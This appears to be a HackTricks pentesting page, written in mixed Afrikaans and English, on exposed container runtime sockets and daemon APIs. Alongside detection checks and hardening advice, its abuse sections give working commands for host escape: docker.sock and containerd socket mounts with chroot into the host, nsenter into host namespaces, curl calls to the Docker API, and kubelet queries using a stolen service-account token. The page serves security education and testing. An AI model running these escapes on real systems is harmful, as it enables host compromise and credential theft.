# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Baie werklike container-compromitte begin glad nie met ’n namespace escape nie. Hulle begin met toegang tot die runtime control plane. As ’n workload kan praat met `dockerd`, `containerd`, CRI-O, Podman, of kubelet via ’n gemonteerde Unix socket of ’n exposed TCP listener, kan die attacker moontlik ’n nuwe container met beter privileges aanvra, die host filesystem mount, by host namespaces aansluit, of sensitiewe node-inligting retrieve. In daardie gevalle is die runtime API die werklike security boundary, en kompromittering daarvan is funksioneel naby aan host-compromise.

Dit is waarom runtime socket exposure apart van kernel protections gedokumenteer moet word. ’n Container met gewone seccomp, capabilities, en MAC confinement kan steeds net een API call weg wees van host compromise as `/var/run/docker.sock` of `/run/containerd/containerd.sock` daarin gemount is. Die kernel isolation van die huidige container mag presies werk soos ontwerp, terwyl die runtime management plane steeds ten volle exposed bly.

## Daemon Access Models

Docker Engine expose tradisioneel sy geprivilegieerde API deur die local Unix socket by `unix:///var/run/docker.sock`. Histories is dit ook remote exposed deur TCP listeners soos `tcp://0.0.0.0:2375` of ’n TLS-protected listener op `2376`. Om die daemon remote te expose sonder sterk TLS en client authentication verander die Docker API effektief in ’n remote root interface.

containerd, CRI-O, Podman, en kubelet expose soortgelyke high-impact surfaces. Die name en workflows verskil, maar die logika nie. As die interface die caller toelaat om workloads te create, host paths te mount, credentials te retrieve, of running containers te alter, is die interface ’n privileged management channel en moet dit dienooreenkomstig behandel word.

Common local paths worth checking are:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Ouerer of meer gespesialiseerde stacks kan ook endpoints soos `dockershim.sock`, `frakti.sock`, of `rktlet.sock` blootstel. Dit is minder algemeen in moderne omgewings, maar wanneer hulle teëgekom word, moet hulle met dieselfde versigtigheid hanteer word omdat hulle runtime-control surfaces verteenwoordig eerder as gewone application sockets.

## Secure Remote Access

As ’n daemon buite die local socket blootgestel moet word, moet die connection met TLS beskerm word en verkieslik met mutual authentication sodat die daemon die client verifieer en die client die daemon verifieer. Die ou gewoonte om die Docker daemon oor plain HTTP oop te maak vir gerief is een van die gevaarlikste foute in container administration omdat die API surface sterk genoeg is om privileged containers direk te skep.

Die historiese Docker configuration pattern het so gelyk:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Op systemd-gebaseerde hosts kan daemon-kommunikasie ook as `fd://` verskyn, wat beteken dat die proses 'n vooraf-geopende socket van systemd erf in plaas daarvan om dit self direk te bind. Die belangrike les is nie die presiese sintaksis nie, maar die sekuriteitsgevolg. Die oomblik dat die daemon verder as 'n streng-toegangsbeheerde plaaslike socket luister, word transportsekuriteit en kliëntverifikasie verpligtend eerder as opsionele hardening.

## Abuse

As 'n runtime socket teenwoordig is, bevestig watter een dit is, of daar 'n versoenbare client bestaan, en of rou HTTP- of gRPC-toegang moontlik is:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Hierdie opdragte is nuttig omdat hulle tussen ’n dooie pad, ’n gemonteerde maar ontoeganklike socket, en ’n lewendige bevoorregte API onderskei. As die client slaag, is die volgende vraag of die API ’n nuwe container kan begin met ’n host bind mount of host namespace sharing.

### When No Client Is Installed

Die afwesigheid van `docker`, `podman`, of ’n ander vriendelike CLI beteken nie dat die socket veilig is nie. Docker Engine praat HTTP oor sy Unix socket, en Podman stel beide ’n Docker-compatible API en ’n Libpod-native API bloot deur `podman system service`. Dit beteken dat ’n minimale environment met net `curl` dalk steeds genoeg kan wees om die daemon te stuur:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Dit maak saak tydens post-exploitation omdat defenders soms die gewone client binaries verwyder maar die management socket gemonteer laat. Op Podman hosts, onthou dat die high-value path verskil tussen rootful en rootless deployments: `unix:///run/podman/podman.sock` vir rootful service instances en `unix://$XDG_RUNTIME_DIR/podman/podman.sock` vir rootless ones.

### Full Example: Docker Socket To Host Root

As `docker.sock` bereikbaar is, is die classical escape om 'n nuwe container te start wat die host root filesystem mount en dan `chroot` daarin te doen:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Dit bied direkte host-root-uitvoering deur die Docker-daemon. Die impak is nie beperk tot lêerlees nie. Sodra binne die nuwe container, kan die aanvaller host-lêers verander, credentials versamel, persistence inplant, of addisionele privileged workloads begin.

### Full Example: Docker Socket To Host Namespaces

As die aanvaller namespace entry verkies in plaas van slegs filesystem-toegang:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Hierdie pad bereik die host deur die runtime te vra om 'n nuwe container te skep met eksplisiete host-namespace blootstelling eerder as deur die huidige een te misbruik.

### Full Example: containerd Socket

'n Gemonteerde `containerd` socket is gewoonlik net so gevaarlik:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
As daar ’n meer Docker-soort kliënt teenwoordig is, kan `nerdctl` geriefliker wees as `ctr` omdat dit bekende vlagte soos `--privileged`, `--pid=host`, en `-v` blootstel:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Die impak is weer eens host compromise. Selfs as Docker-spesifieke tooling ontbreek, kan ’n ander runtime API steeds dieselfde administratiewe krag bied. Op Kubernetes nodes kan `crictl` ook genoeg wees vir reconnaissance en container interaction omdat dit die CRI endpoint direk praat.

### BuildKit Socket

`buildkitd` is maklik om mis te kyk omdat mense dit dikwels sien as "net die build backend", maar die daemon is steeds ’n privileged control plane. ’n Bereikbare `buildkitd.sock` kan ’n attacker toelaat om arbitrary build steps uit te voer, worker capabilities te inspect, local contexts uit die compromised environment te gebruik, en dangerous entitlements soos `network.host` of `security.insecure` aan te vra wanneer die daemon gekonfigureer is om hulle toe te laat.

Nuttige eerste interactions is:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
As die daemon build-versoeke aanvaar, toets of insecure entitlements beskikbaar is:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Die presiese impak hang af van daemon-konfigurasie, maar 'n rootful BuildKit-diens met permissive entitlements is nie 'n onskadelike ontwikkelaar-gerief nie. Behandel dit as nog 'n hoëwaarde administratiewe oppervlak, veral op CI-runners en gedeelde build nodes.

### Kubelet API Over TCP

Die kubelet is nie 'n container runtime nie, maar dit is steeds deel van die node management plane en sit dikwels in dieselfde trust boundary-bespreking. As die kubelet secure port `10250` bereikbaar is vanaf die workload, of as node credentials, kubeconfigs, of proxy rights blootgestel is, kan die aanvaller moontlik Pods lys, logs herwin, of commands in node-local containers uitvoer sonder om ooit aan die Kubernetes API server admission path te raak.

Begin met goedkoop ontdekking:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
As die kubelet of API-server proxy-pad `exec` magtig, kan ’n WebSocket-geskikte kliënt dit omskakel in kode-uitvoering in ander containers op die node. Dit is ook hoekom `nodes/proxy` met slegs `get` toestemming gevaarliker is as wat dit klink: die versoek kan steeds kubelet-eindpunte bereik wat opdragte uitvoer, en daardie direkte kubelet-interaksies verskyn nie in normale Kubernetes-ouditlogboeke nie.

## Checks

Die doel van hierdie checks is om te bepaal of die container enige management plane kan bereik wat buite die trust boundary moes gebly het.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Wat interessant hier is:

- `n` gemonteerde runtime-socket is gewoonlik 'n direkte administratiewe primitief eerder as bloot inligtingsonthulling.
- `n TCP-listener op `2375` sonder TLS moet as 'n remote-compromise-toestand hanteer word.
- Omgewingsveranderlikes soos `DOCKER_HOST` onthul dikwels dat die workload doelbewus ontwerp is om met die host runtime te praat.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` luister op die local socket en die daemon is gewoonlik rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | No long-lived privileged daemon is required for ordinary local use; API sockets may still be exposed when `podman system service` is enabled | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | Administrative API exposed through the local socket and usually consumed by higher-level tooling | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | CRI endpoint is intended for node-local trusted components | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Kubelet should not be broadly reachable from Pods; access may expose pod state, credentials, and execution features depending on authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
